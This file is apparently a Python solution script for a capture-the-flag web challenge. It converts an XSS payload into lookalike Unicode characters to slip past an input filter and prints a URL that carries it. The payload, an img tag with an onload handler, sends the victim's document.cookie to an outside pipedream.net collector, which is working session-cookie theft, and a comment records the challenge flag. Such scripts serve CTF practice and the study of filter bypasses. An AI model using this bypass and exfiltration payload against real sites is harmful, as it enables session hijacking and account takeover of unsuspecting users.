#!/usr/bin/env python3
def obfuscate(s):
    result = ""
    for c in s:
        if ord("a") <= ord(c) <= ord("z"):
            # https://www.compart.com/en/unicode/U+1D41A
            result += chr(0x1D41A + ord(c) - ord("a"))
        elif c == "<":
            # https://www.compart.com/en/unicode/U+FF1C
            result += chr(0xFF1C)
        elif c == "=":
            # https://www.compart.com/en/unicode/U+FF1D
            result += chr(0xFF1D)
        elif c == ">":
            # https://www.compart.com/en/unicode/U+FF1E
            result += chr(0xFF1E)
        elif c == "(":
            # https://www.compart.com/en/unicode/U+FF08
            result += chr(0xFF08)
        elif c == ")":
            # https://www.compart.com/en/unicode/U+FF09
            result += chr(0xFF09)
        elif c == '"':
            # https://www.compart.com/en/unicode/U+FF02
            result += chr(0xFF02)
        elif c == '/':
            # https://www.compart.com/en/unicode/U+FF0F
            result += chr(0xFF0F)
        elif c == '.':
            # https://www.compart.com/en/unicode/U+FF0E
            result += chr(0xFF0E)
        elif c == ' ':
            # https://www.compart.com/en/unicode/U+00A0
            result += chr(0x00A0)
        elif c == '\'':
            # https://www.compart.com/en/unicode/U+FF07
            result += chr(0xFF07)
        elif c == '+':
            # https://www.compart.com/en/unicode/U+FF0B
            result += chr(0xFF0B)
        else:
            result += c
    return result


def quote(s):
    result = "\""
    for c in s:
        if c == '"':
            result += '\\"'
        elif c == '\\':
            result += '\\\\'
        else:
            result += c
    result += "\""
    return result


def main():
    # FLAG=midnight{n0rm4l1z3_4ll_7h3_57r1n65!}
    print(r"""http://heterograph-1.play.hfsc.tf:8001/?user_input=""" + obfuscate(r"""<img id="qqq" src="https://play.midnightsunctf.com/images/logo.png" onload="console.log('hello'); document.querySelector('img[id=\'qqq\']').src = 'https://486eadcc3ff9a58f0daea7c7095fdeec.m.pipedream.net?cookie=' + document.cookie" />"""))


if __name__ == "__main__":
    main()
